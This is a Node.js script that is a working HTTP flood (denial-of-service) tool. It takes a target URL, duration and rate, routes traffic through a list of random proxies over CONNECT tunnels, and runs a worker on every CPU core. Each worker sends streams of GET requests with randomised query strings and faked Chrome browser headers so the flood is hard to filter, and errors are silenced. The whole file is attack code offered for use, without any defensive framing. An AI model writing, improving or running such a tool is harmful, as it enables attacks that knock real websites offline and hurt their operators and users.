const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');


var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
rate:process.argv[4]

}

if (process.argv.length !== 5) {
    console.log(`
------------------------------------------------------------------
Usage: target time rate
`);
    process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

var proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

const numCPUs = cpus().length;
if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {

function BuildRequest() {
let path = parsed.path;
if (path.indexOf("[rand]") !== -1){
    path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
}
var raw_socket = 'GET' + ' ' + path + '?query=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\n' +
    'Host: ' + parsed.host + '\r\n' +
    'sec-ch-ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"\r\n' +
    'sec-ch-ua-mobile: ?0\r\n' +
    'sec-ch-ua-platform: "Windows"\r\n' +
    'upgrade-insecure-requests: 1\r\n' +
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\n' +
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
    'sec-fetch-site: none\r\n' +
    'sec-fetch-mode: navigate\r\n' +
    'sec-fetch-user: ?1\r\n' +
    'sec-fetch-dest: document\r\n' +
    'accept-encoding: gzip, deflate, br\r\n' +
    'accept-language: en-US,en;q=0.9\r\n' +
    'Connection: keep-alive\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var getrandprxy = getRandomNumberBetween(100, proxies.length-2000);

var proxy = proxies[Math.floor(Math.random() * getrandprxy)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'keep-alive',
    'Connection': 'keep-alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        ALPNProtocols: ['h2', 'http/1.1'],
        rejectUnauthorized: false,
        socket: socket,
        host: parsed.host,
        port: 433,
        servername: parsed.host,
    }, function () {

for (let j = 0; j < VarsDefinetions.rate; j++) {

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

TlsConnection.on('end', () => {
  TlsConnection.abort();
  TlsConnection.destroy();
});

}).end()
}, 0);
}

setTimeout(() => {
    console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
}, VarsDefinetions.time*1000)